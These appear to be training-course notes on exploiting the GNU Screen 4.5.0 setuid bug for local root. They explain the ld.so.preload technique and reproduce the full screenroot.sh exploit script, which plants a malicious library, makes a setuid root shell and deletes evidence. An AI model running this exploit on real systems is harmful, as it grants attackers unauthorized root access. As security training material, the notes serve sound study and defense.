# Linux Privilege Escalation — Vulnerable Services (Screen 4.5.0 Example)

**Module:** HTB Academy (Linux Privilege Escalation track)

---

## Concept

- Outdated/misconfigured services on a system can harbor known privilege escalation vulnerabilities.
- Example used: **GNU Screen v4.5.0** — a popular terminal multiplexer.

---

## The Vulnerability

- Screen 4.5.0 is missing a **permissions check when opening a log file**.
- Impact: an attacker can **truncate any file** or **create a file owned by root** in any directory → leads to **full root access**.

### Identify the Version

```bash
screen -v
# Screen version 4.05.00 (GNU) 10-Dec-16
```

---

## Exploitation — screenroot.sh

### Running the Exploit

```bash
./screen_exploit.sh
```

```
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),27(sudo),...,1000(mrb3n)
```

- Result: a root shell, confirmed via `id`.

### How the Exploit Works

1. **Build a malicious shared library** (`libhax.so`) whose constructor function:
   - `chown`s `/tmp/rootshell` to root:root
   - `chmod`s it to `04755` (setuid root)
   - Deletes `/etc/ld.so.preload` (cleanup/cover tracks)
2. **Build `/tmp/rootshell`** — a tiny C program that calls `setuid(0)`, `setgid(0)`, `seteuid(0)`, `setegid(0)`, then `execvp("/bin/sh", ...)`.
3. Abuse **Screen's setuid-root** status + the missing permission check to **write to `/etc/ld.so.preload`** — a file that, if writable, causes the dynamic linker to preload the attacker's shared library into **every subsequently executed setuid binary**.
   ```bash
   screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
   ```
   - Screen creates/writes the log file as root due to the missing permission check → `/etc/ld.so.preload` now contains a pointer to `/tmp/libhax.so`.
4. **Trigger**: running `screen -ls` (or any setuid binary) causes the dynamic linker to load `libhax.so`, which runs its constructor → sets up `/tmp/rootshell` as a setuid-root binary and removes the preload file.
5. Execute `/tmp/rootshell` → instant **root shell**.

### Full Exploit Script

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Key Takeaways

- The core primitive being abused: **`/etc/ld.so.preload`** — any process that can write to this file can get arbitrary code loaded into **every setuid binary** run afterward, which is a direct path to root.
- Screen's bug (missing permission check on log file creation via `-L`) is what allows an **unprivileged user** to write to `/etc/ld.so.preload` in the first place, since Screen itself runs setuid-root.
- General lesson for privilege escalation hunting: **always check the version of running/installed services** against known CVEs — outdated terminal multiplexers, SUID binaries, and other common tools are frequent sources of local privesc exploits.
- Defense: keep software patched/updated; avoid unnecessary **setuid** bits on binaries; restrict write access to sensitive system files like `/etc/ld.so.preload`.
